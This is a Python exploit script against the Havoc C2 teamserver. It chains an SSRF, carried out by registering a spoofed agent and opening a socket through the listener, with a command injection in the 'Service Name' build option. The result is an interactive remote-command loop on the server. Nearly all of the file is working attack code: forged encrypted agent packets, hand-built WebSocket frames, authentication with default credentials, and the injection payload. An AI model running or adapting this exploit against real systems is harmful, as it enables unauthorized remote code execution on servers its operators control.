# Inclusions from 
#    https://github.com/chebuya/Havoc-C2-SSRF-poc
import binascii
import random
import requests
import argparse
import urllib3
urllib3.disable_warnings()
from Crypto.Cipher import AES
from Crypto.Util import Counter

# Inclusions from:
#     https://github.com/IncludeSecurity/c2-vulnerabilities/tree/main/havoc_auth_rce
from hashlib import sha3_256
import json

# My inclusions
from datetime import datetime
import random
import os
import base64

agent_id = b""
AES_Key = b"\x00" * 32
AES_IV = b"\x00" * 16
magic = b"\xde\xad\xbe\xef"
teamserver_listener_url = ""
headers = {}
key_bytes = 32

def decrypt(key, iv, ciphertext):
    if len(key) <= key_bytes:
        for _ in range(len(key), key_bytes):
            key += b"0"

    assert len(key) == key_bytes

    iv_int = int(binascii.hexlify(iv), 16)
    ctr = Counter.new(AES.block_size * 8, initial_value=iv_int)
    aes = AES.new(key, AES.MODE_CTR, counter=ctr)

    plaintext = aes.decrypt(ciphertext)
    return plaintext


def int_to_bytes(value, length=4, byteorder="big"):
    return value.to_bytes(length, byteorder)


def encrypt(key, iv, plaintext):

    if len(key) <= key_bytes:
        for x in range(len(key),key_bytes):
            key = key + b"0"

        assert len(key) == key_bytes

        iv_int = int(binascii.hexlify(iv), 16)
        ctr = Counter.new(AES.block_size * 8, initial_value=iv_int)
        aes = AES.new(key, AES.MODE_CTR, counter=ctr)

        ciphertext = aes.encrypt(plaintext)
        return ciphertext

def register_agent(hostname, username, domain_name, internal_ip, process_name, process_id):
    global AES_Key,AES_IV,magic,teamserver_listener_url,headers,agent_id

    # DEMON_INITIALIZE / 99
    command = b"\x00\x00\x00\x63"
    request_id = b"\x00\x00\x00\x01"
    demon_id = agent_id

    hostname_length = int_to_bytes(len(hostname))
    username_length = int_to_bytes(len(username))
    domain_name_length = int_to_bytes(len(domain_name))
    internal_ip_length = int_to_bytes(len(internal_ip))
    process_name_length = int_to_bytes(len(process_name) - 6)

    data =  b"\xab" * 100

    header_data = command + request_id + AES_Key + AES_IV + demon_id + hostname_length + hostname + username_length + username + domain_name_length + domain_name + internal_ip_length + internal_ip + process_name_length + process_name + process_id + data

    size = 12 + len(header_data)
    size_bytes = size.to_bytes(4, 'big')
    agent_header = size_bytes + magic + agent_id

    print("[***] Trying to register agent...")
    r = requests.post(teamserver_listener_url, data=agent_header + header_data, headers=headers, verify=False)
    if r.status_code == 200:
        print("[***] Success!")
    else:
        print(f"[!!!] Failed to register agent - {r.status_code} {r.text}")


def open_socket(socket_id, target_address, target_port):
    global AES_Key,AES_IV,magic,teamserver_listener_url,headers,agent_id

    # COMMAND_SOCKET / 2540
    command = b"\x00\x00\x09\xec"
    request_id = b"\x00\x00\x00\x02"

    # SOCKET_COMMAND_OPEN / 16
    subcommand = b"\x00\x00\x00\x10"
    sub_request_id = b"\x00\x00\x00\x03"

    local_addr = b"\x22\x22\x22\x22"
    local_port = b"\x33\x33\x33\x33"


    forward_addr = b""
    for octet in target_address.split(".")[::-1]:
        forward_addr += int_to_bytes(int(octet), length=1)

    forward_port = int_to_bytes(target_port)

    package = subcommand+socket_id+local_addr+local_port+forward_addr+forward_port
    package_size = int_to_bytes(len(package) + 4)

    header_data = command + request_id + encrypt(AES_Key, AES_IV, package_size + package)

    size = 12 + len(header_data)
    size_bytes = size.to_bytes(4, 'big')
    agent_header = size_bytes + magic + agent_id
    data = agent_header + header_data

    print("[***] Trying to open socket on the teamserver...")
    # print(f"[*] URL -> {teamserver_listener_url} | Headers -> {headers} | Data -> {{\"data\":\"{data}\"}}")
    r = requests.post(teamserver_listener_url, data=data, headers=headers, verify=False)
    if r.status_code == 200:
        print("[***] Success!")
    else:
        print(f"[!!!] Failed to open socket on teamserver - {r.status_code} {r.text}")


def write_socket(socket_id, data):
    global AES_Key,AES_IV,magic,teamserver_listener_url,headers,agent_id
    # COMMAND_SOCKET / 2540
    command = b"\x00\x00\x09\xec"
    request_id = b"\x00\x00\x00\x08"

    # SOCKET_COMMAND_READ / 11 :: Read the callback and send it to the forwared host/socks proxy
    subcommand = b"\x00\x00\x00\x11"
    sub_request_id = b"\x00\x00\x00\xa1"

    # SOCKET_TYPE_CLIENT / 3
    socket_type = b"\x00\x00\x00\x03"
    success = b"\x00\x00\x00\x01"

    data_length = int_to_bytes(len(data))

    package = subcommand+socket_id+socket_type+success+data_length+data
    package_size = int_to_bytes(len(package) + 4)

    header_data = command + request_id + encrypt(AES_Key, AES_IV, package_size + package)

    size = 12 + len(header_data)
    size_bytes = size.to_bytes(4, 'big')
    agent_header = size_bytes + magic + agent_id
    post_data = agent_header + header_data

    print("[***] Trying to write to the socket")
    # print(f"[*] Sending Request To -> {teamserver_listener_url}")

    # print(f"[*] POST Data -> {post_data}")

    r = requests.post(teamserver_listener_url, data=post_data, headers=headers, verify=False)
    if r.status_code == 200:
        print("[***] Success!")
    else:
        print(f"[!!!] Failed to write data to the socket - {r.status_code} {r.text}")

def read_socket(socket_id):
    global AES_Key,AES_IV,magic,teamserver_listener_url,headers,agent_id
    # COMMAND_GET_JOB / 1
    command = b"\x00\x00\x00\x01"
    request_id = b"\x00\x00\x00\x09"

    header_data = command + request_id

    size = 12 + len(header_data)
    size_bytes = size.to_bytes(4, 'big')
    agent_header = size_bytes + magic + agent_id
    data = agent_header + header_data

    print("[***] Trying to poll teamserver for socket output...")
    # print(f"[*] URL -> {teamserver_listener_url} | Headers -> {headers} | Data -> {{\"data\":\"{data}\"}}")
    r = requests.post(teamserver_listener_url, data=data, headers=headers, verify=False)
    if r.status_code == 200:
        print("[***] Read socket output successfully!")
    else:
        print(f"[!!!] Failed to read socket output - {r.status_code} {r.text}")
        return ""


    command_id = int.from_bytes(r.content[0:4], "little")
    request_id = int.from_bytes(r.content[4:8], "little")
    package_size = int.from_bytes(r.content[8:12], "little")
    enc_package = r.content[12:]

    return decrypt(AES_Key, AES_IV, enc_package)[12:]

# websocket communication funcs
def create_init_ws(ip, port):
    # Generate the Sec-WebSocket-Key
    nonce = os.urandom(16)
    websocket_key = base64.b64encode(nonce).decode()

    # Construct the WebSocket HTTP request
    request = "\r\n".join(
        [
            f"GET /havoc/ HTTP/1.1",
            f"Host: {ip}:{port}",
            f"Upgrade: websocket",
            f"Connection: Upgrade",
            f"Sec-WebSocket-Key: {websocket_key}",
            f"Sec-WebSocket-Version: 13",
            f"\r\n", # if this string is empty the exploit fails!
        ]
    ).encode()
    return request

# responsible for creating the websocket frame
def create_ws_frame(json_data, opcode=1, fin=True):
    payload_bytes = json.dumps(json_data).encode("utf-8")
    payload_length = len(payload_bytes)

    # Initialize the WebSocket frame
    frame = bytearray()
    
    frame.append(0x81)  # FIN bit set, opcode for text frame

    # Determine the payload length and frame header
    if payload_length <= 125:
        frame.append(0x80 | payload_length)
    elif payload_length <= 65535:
        frame.append(0x80 | 126)
        frame.extend(payload_length.to_bytes(2, byteorder="big"))
    else:
        frame.append(0x80 | 127)
        frame.extend(payload_length.to_bytes(8, byteorder="big"))

    # Generate a masking key
    masking_key = os.urandom(4)
    frame.extend(masking_key)

    # Apply the masking key to the payload
    masked_payload = bytearray(byte ^ masking_key[i % 4] for i, byte in enumerate(payload_bytes))
    frame.extend(masked_payload)

    return frame
    
def create_teamserver_auth(teamserver_username, teamserver_passwd):
    # JSON Payload for the WebSocket
    time_stamp = datetime.now().strftime("%H:%M:%S")
    payload = {
        "Body": {
            "Info": {
                "Password": sha3_256(teamserver_passwd.encode()).hexdigest(),
                "User": teamserver_username
            },
            "SubEvent": 3
        },
        "Head": {
            "Event": 1,
            "OneTime": "",
            "Time": time_stamp,
            "User": teamserver_username
        }
    }
    return create_ws_frame(payload)

def create_demon_listener(teamserver_username, user_agent, listener_name):
    time_stamp = datetime.now().strftime("%H:%M:%S")
    payload = {
        "Body": {
            "Info": {
                "Headers": "",
                "HostBind": "0.0.0.0",
                "HostHeader": "",
                "HostRotation": "round-robin",
                "Hosts": "0.0.0.0",
                "Name": listener_name,
                "PortBind": "443",
                "PortConn": "443",
                "Protocol": "Https",
                "Proxy Enabled": "false",
                "Secure": "true",
                "Status": "online",
                "Uris": "",
                "UserAgent": user_agent,
            },
            "SubEvent": 1,
        },
        "Head": {"Event": 2, "OneTime": "", "Time": time_stamp, "User": teamserver_username},
    }
    return create_ws_frame(payload)

def create_rce_payload(teamserver_username, cmd, listener_name):
    time_stamp = datetime.now().strftime("%H:%M:%S")
    injection = """ \\\\\\\" -mbla; """ + cmd + """ 1>&2 && false #"""
    payload = {
        "Body": {
            "Info": {
                "AgentType": "Demon",
                "Arch": "x64",
                "Config": '{\n "Amsi/Etw Patch": "None",\n "Indirect Syscall": false,\n "Injection": {\n "Alloc": "Native/Syscall",\n "Execute": "Native/Syscall",\n "Spawn32": "C:\\\\Windows\\\\SysWOW64\\\\notepad.exe",\n "Spawn64": "C:\\\\Windows\\\\System32\\\\notepad.exe"\n },\n "Jitter": "0",\n "Proxy Loading": "None (LdrLoadDll)",\n "Service Name":"' + injection + '",\n "Sleep": "2",\n "Sleep Jmp Gadget": "None",\n "Sleep Technique": "WaitForSingleObjectEx",\n "Stack Duplication": false\n}\n',
                "Format": "Windows Service Exe",
                "Listener": listener_name,
            },
            "SubEvent": 2,
        },
        "Head": {"Event": 5, "OneTime": "true", "Time": time_stamp, "User": teamserver_username},
    }
    return create_ws_frame(payload)

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", help="The listener target in URL format", required=True)
    parser.add_argument("-i", "--ip", help="The IP to open the socket with", default="127.0.0.1")
    parser.add_argument("-p", "--port", help="The port to open the socket with", required=True)
    parser.add_argument("-u", "--username", help="Havoc Teamserver Username", default="Neo")
    parser.add_argument("-pwd", "--password", help="Havoc Teamserver Password", default="password1234")

    parser.add_argument("-A", "--user-agent", help="The User-Agent for the spoofed agent", default="Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36")
    parser.add_argument("-H", "--hostname", help="The hostname for the spoofed agent", default="DESKTOP-7F61JT1")
    parser.add_argument("-agent-username", help="The username for the spoofed agent", default="Administrator")
    parser.add_argument("-d", "--domain-name", help="The domain name for the spoofed agent", default="ECORP")
    parser.add_argument("-n", "--process-name", help="The process name for the spoofed agent", default="msedge.exe")
    parser.add_argument("-ip", "--internal-ip", help="The internal ip for the spoofed agent", default="10.1.33.7")

    args = parser.parse_args()

    global AES_Key,AES_IV,magic,teamserver_listener_url,headers,agent_id
    # 0xDEADBEEF
    # magic = b"\xde\xad\xbe\xef"
    teamserver_listener_url = args.target
    headers = {
        "User-Agent": args.user_agent
    }
    agent_id = int_to_bytes(random.randint(100000, 1000000))
    AES_Key = b"\x00" * 32
    AES_IV = b"\x00" * 16
    hostname = bytes(args.hostname, encoding="utf-8")
    username = bytes(args.agent_username, encoding="utf-8")
    domain_name = bytes(args.domain_name, encoding="utf-8")
    internal_ip = bytes(args.internal_ip, encoding="utf-8")
    process_name = args.process_name.encode("utf-16le")
    process_id = int_to_bytes(random.randint(1000, 5000))

    register_agent(hostname, username, domain_name, internal_ip, process_name, process_id)

    socket_id = b"\x11\x11\x11\x11"
    #                     Target IP     Targt PORT
    open_socket(socket_id, args.ip, int(args.port))

    print("[*] Attempting to use WebSockets. . .")
    write_socket(socket_id, create_init_ws(args.ip, args.port))

    print("[*] ----- Retrieving Response -----")
    print(f"{read_socket(socket_id).decode()}")
    print("-----------------------------------")

    # In order to interact with the websocket we need to format the data we send
    # into a websocket frame (thank god gpt can help)

    # Send the Authentication for ilya or sergej
    print("[*] Sending in Authentication. . .")
    write_socket(socket_id, create_teamserver_auth(args.username, args.password))

    # Create a new listener we can tap into during demon payload creation
    print("[*] Attempting to Create a Known Listener. . .")
    demonListener = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=8))
    write_socket(socket_id, create_demon_listener(args.username, args.user_agent, demonListener))

    # Attempt pushing a command in the service name to gain RCE against teamserver
    print("[*] Attempting to send RCE Payload. . .")

    # Allow the user to run commands until they wish to terminate the session
    cmd = ""
    while cmd != "exit":
        # collect input then check if exit is entered
        cmd = input("CMD >> ")
        if cmd == "exit":
            break
        # attempt sending the command to the teamserver
        write_socket(socket_id, create_rce_payload(args.username, cmd, demonListener))
    
        # perform curls to test for call-backs!
        # reading the socket after sending ws frames
        # may not output text
        print(f"{read_socket(socket_id).decode()}")

if __name__ == "__main__":
    main()
